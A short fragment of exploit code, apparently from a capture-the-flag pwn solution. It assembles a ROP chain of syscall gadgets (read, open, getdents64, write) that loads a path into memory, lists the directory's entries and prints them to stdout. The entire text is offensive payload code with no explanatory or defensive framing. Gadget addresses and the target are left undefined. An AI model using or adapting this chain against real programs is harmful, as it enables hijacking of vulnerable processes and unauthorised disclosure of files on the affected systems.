# read
rop = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x10) + p64(syscall)
# open
rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(readable_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
# getdents64
rop+= p64(rax) + p64(0xD9) + p64(rdi) + p64(3) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x100) + p64(syscall)
# write
rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(readable_adr) + p64(rdx) + p64(0x702) + p64(syscall)
